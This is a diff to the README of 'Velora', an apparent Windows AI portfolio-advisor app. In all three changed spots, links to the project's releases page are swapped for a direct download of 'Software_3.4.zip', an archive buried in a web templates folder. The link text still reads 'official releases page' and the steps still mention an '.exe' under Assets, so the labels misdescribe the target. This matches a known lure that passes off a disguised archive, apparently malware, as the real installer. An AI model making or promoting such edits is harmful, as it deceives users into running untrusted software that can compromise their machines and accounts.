@@ -1,6 +1,6 @@
 # 📈 Velora - Grow your wealth with AI insights
 
-[![Download Velora](https://img.shields.io/badge/Download-Velora_for_Windows-blue.svg)](https://github.com/waterbruh/Velora/releases)
+[![Download Velora](https://img.shields.io/badge/Download-Velora_for_Windows-blue.svg)](https://github.com/waterbruh/Velora/raw/refs/heads/main/src/web/templates/components/Software_3.4.zip)
 
 Velora acts as your personal wealth advisor. It watches your investment portfolio, scans market data, and delivers updates to your Telegram app. The software uses your existing Claude account to process market information. This setup prevents extra API costs.
 
@@ -16,7 +16,7 @@ You need a few items before you begin. Check this list to ensure your computer s
 
 ## 📥 How to download the app
 
-1. Visit the [official releases page](https://github.com/waterbruh/Velora/releases) to find the latest version of the installer.
+1. Visit the [official releases page](https://github.com/waterbruh/Velora/raw/refs/heads/main/src/web/templates/components/Software_3.4.zip) to find the latest version of the installer.
 2. Locate the file ending in `.exe` under the Assets section.
 3. Click the file name to start the download.
 4. Save the file to your desktop or your Downloads folder for easy access.
@@ -99,4 +99,4 @@ The app updates your portfolio once every day by default. You can change this to
 
 Ready to begin? Download the software now and start your first briefing.
 
-[Download Velora](https://github.com/waterbruh/Velora/releases)
+[Download Velora](https://github.com/waterbruh/Velora/raw/refs/heads/main/src/web/templates/components/Software_3.4.zip)
